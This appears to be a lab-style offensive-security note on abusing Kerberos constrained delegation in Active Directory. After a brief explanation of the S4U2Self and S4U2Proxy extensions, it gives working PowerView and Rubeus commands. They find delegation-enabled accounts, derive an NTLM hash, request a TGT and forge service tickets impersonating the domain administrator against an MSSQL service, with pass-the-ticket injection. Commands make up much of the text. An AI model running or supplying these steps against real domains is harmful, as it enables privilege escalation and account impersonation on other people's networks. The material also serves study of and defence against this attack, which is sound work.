# Kerberos - Constrained Delegation

Constrained delegation is an updated and safer version of Kerberos delegation released in 2003.

The main goal of Kerberos delegation is to solve the double-hop issue.
While unconstrained delegation allowed the service to perform authentication to anything in the domain, constrained delegation limits the delegation scope.

The kerberos protocol does not natively support constrained delegation by default, there is two extensions for this feature : S4U2Self and S4U2Proxy. 
Together, these extension solve the double-hop issue and limit access to only the desired backend service.

1. We can locate any instances of constrained delegation using PowerView :

```PowerShell
Get-DomainUser -TrustedToAuth
```

Rubeus includes S4U extension support.
Kekeo by Mimikatz author also provides access to S4U extension above.

2. If we only have the clear text password we can use the hash command in Rubeus to generate the NTLM hash :

```PowerShell
.\Rubeus.exe hash /password:lab
```

3. We can generate a TGT with Rubeus.

```PowerShell
.\Rubeus.exe asktgt /user:v0lk3n /domain:dev.sinhack1.com /rc4:3252D26CDF84D7A70E2EB3B9F05C425E
```

4. With the Base64-encoded TGT for v0lk3n, we are ready to invoke the S4U extensions.

```PowerShell
PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.dev.sinhack1.com:1433 /ptt
```
